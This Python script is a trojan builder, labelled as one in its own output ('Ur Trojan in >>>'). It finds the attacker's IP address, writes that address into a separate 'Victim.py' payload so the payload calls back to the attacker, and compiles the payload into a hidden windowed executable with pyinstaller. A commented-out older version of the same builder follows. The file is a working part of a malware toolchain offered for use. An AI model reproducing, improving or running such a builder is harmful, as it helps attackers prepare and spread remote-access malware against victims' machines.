import subprocess as sp
import os
import socket
import re
from sys import platform


def changeAttackerIP(IP_Attacker):
    myFile = open("Victim.py", "r")
    new_content = myFile.read()
    regexPattern = r"IPAttacker = \"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\""
    new_content = re.sub(regexPattern, "IPAttacker = \"{}\"".format(IP_Attacker), new_content)
    myFile.close()
    myFile3 = open('Victim.py', 'w')
    myFile3.write(new_content)


def main():
    # Change IP of Attacker in Victim Script
    symbol = '/'
    if platform == "linux" or platform == "linux2":
        symbol = '/'
    else:
        symbol = '\\'

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('10.0.0.0', 0))
    IPAttacker = s.getsockname()[0]
    changeAttackerIP(IPAttacker)

    # Convert to exe file by 2 steps
    # 1- Get main.py location
    workingDire = os.getcwd() + f"{symbol}Victim.py"

    # 2- Convert it to exe file
    if platform == "linux" or platform == "linux2":
        Command = "pyinstaller --noconfirm --exclude-module _bootlocale --onefile --windowed \"{}\"".format(workingDire)
        result = sp.call(Command, shell=True)
    else:
        Command = "pyinstaller --noconfirm --onefile --windowed \"{}\"".format(workingDire)
        result = sp.run(["powershell.exe", Command], shell=True, stdin=sp.DEVNULL)

    # Trojan Directory
    trojDire = os.getcwd() + f"{symbol}dist"
    # print("[+] Ur Trojan in >>> {}".format(trojDire))
    return f"[+] Ur Trojan in >>> {trojDire}"


if __name__ == '__main__':
    main()

'''
import subprocess
import os
import socket
import re


def changeAttackerIP(IP_Attacker):
    myFile = open("Victim.py", "r")
    new_content = myFile.read()
    regexPattern = r"IPAttacker = \"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\""
    new_content = re.sub(regexPattern, "IPAttacker = \"{}\"".format(IP_Attacker), new_content)
    myFile.close()
    myFile3 = open('Victim.py', 'w')
    myFile3.write(new_content)


if __name__ == '__main__':
    # Change IP of Attacker in Victim Script
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('10.0.0.0', 0))
    IPAttacker = s.getsockname()[0]
    changeAttackerIP(IPAttacker)

    # Convert to exe file by 2 steps
    # 1- Get main.py location
    workingDire = os.getcwd() + "\Victim.py"

    # 2- Convert it to exe file
    Command = "pyinstaller --noconfirm --onefile --windowed \"{}\"".format(workingDire)
    result = subprocess.run(["powershell.exe", Command], shell=True, stdin=subprocess.DEVNULL)

    # Trojan Directory
    trojDire = os.getcwd() + "\dist"
    print("[+] Ur Trojan in >>> {}".format(trojDire))
'''
